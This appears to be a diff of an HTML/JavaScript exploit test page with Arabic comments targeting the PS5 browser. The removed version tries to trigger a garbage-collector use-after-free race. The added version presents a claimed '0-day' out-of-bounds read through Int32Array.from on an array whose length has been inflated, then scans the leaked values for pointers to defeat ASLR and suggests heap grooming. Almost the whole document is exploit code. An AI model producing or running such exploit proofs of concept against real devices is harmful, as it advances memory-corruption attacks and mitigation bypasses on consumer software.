@@ -2,56 +2,54 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 Heap UAF — Concurrent Marking Race</title>
+<title>PS5 0-Day OOB Read via TypedArray.from</title>
 </head>
 <body>
 <pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
 <script>
 const L = s => { document.getElementById('log').textContent += s + '\n'; };
 
-L('[*] Starting Heap Concurrent Marking UAF test...');
+L('[*] Starting 0-Day OOB Read test...');
 
-// الخطوة 1: إنشاء نصوص كثيرة جداً
-L('[*] Phase 1: Allocating 500,000 strings...');
-let strings = [];
-for (let i = 0; i < 500000; i++) {
-    // نصوص قصيرة لملء الـ IsoHeap بسرعة
-    strings.push("str_" + i + "_AAAAAAAAAAAAAAAAAAAA");
-}
-L('[+] Strings allocated.');
+// 1. إنشاء مصفوفة صغيرة بحجم حقيقي (VectorLength = 3)
+let arr = [1, 2, 3];
 
-// الخطوة 2: إجبار جامع القمامة على العمل المتزامن
-// إسقاط المراجع القوية سيجعل النصوص مؤهلة للحذف
-L('[*] Phase 2: Dropping references to trigger GC...');
-strings = null;
+// 2. زيادة الطول المنطقي (Logical Length) إلى 100
+// هذا لا يغير حجم الـ Butterfly في الذاكرة!
+arr.length = 100;
 
-// الخطوة 3: محاولة إطلاق Race Condition
-// نقوم بإنشاء نصوص جديدة بسرعة لدفع المؤقت (Sweeper) للعمل
-// بينما خيط الجامع لا يزال يمسح النصوص القديمة
-L('[*] Phase 3: Racing Sweeper timer with Concurrent Marker...');
+// 3. استدعاء TypedArray.from
+// المسار السريع (genericTypedArrayViewPrivateFuncFromFast) سيدور 100 مرة
+// وس يقرأ 97 عنصراً من خارج حدود الـ Butterfly!
+L('[*] Calling Int32Array.from()...');
+let leaked = Int32Array.from(arr);
 
-function raceGC() {
-    let tmp = [];
-    for (let i = 0; i < 100000; i++) {
-        // إنشاء وتدمير سريع لتوليد ضغط على الذاكرة
-        tmp.push("race_" + i + "_BBBBBBBBBBBBBBBBBBBB");
-    }
-    tmp = null;
-}
-
-// تشغيل السباق عدة مرات لزيادة فرصة الـ UAF
+// 4. قراءة القيم المسربة
+L('[+] Leaked TypedArray length: ' + leaked.length);
+L('[*] First 5 elements (should be 1,2,3,0,0 or leaked data):');
 for (let i = 0; i < 10; i++) {
-    L('  [Race attempt ' + (i+1) + '/10]');
-    raceGC();
-    // تأخير بسيط للسماح لخيط الجامع بالبدء
-    // (متصفح PS5 لا يوفر performance.now دقيق، لذا نستخدم حلقة مشغولة)
-    let waste = 0;
-    for (let j = 0; j < 1000000; j++) { waste += j; }
+    L('  [' + i + ']: ' + leaked[i]);
 }
 
-L('[+] Race finished.');
-L('[*] If the browser crashed, the UAF in the GC collector thread is confirmed.');
-L('[*] If it survived, the timing window might be too tight or GC is configured differently.');
+L('\n[*] If values after index 2 are not 0, we have an Info Leak!');
+L('[*] To break ASLR, we look for values that look like memory addresses (large numbers).');
+
+// محاولة استخراج مؤشرات (Pointers)
+let pointers = [];
+for (let i = 3; i < leaked.length; i++) {
+    if (leaked[i] !== 0) {
+        pointers.push({ index: i, value: leaked[i], hex: '0x' + (leaked[i] >>> 0).toString(16) });
+    }
+}
+
+if (pointers.length > 0) {
+    L('\n[!!!] FOUND NON-ZERO LEAKED DATA!');
+    for (let p of pointers) {
+        L('  Index ' + p.index + ': ' + p.value + ' (' + p.hex + ')');
+    }
+} else {
+    L('\n[-] All leaked values were 0. Try grooming the heap first.');
+}
 </script>
 </body>
 </html>
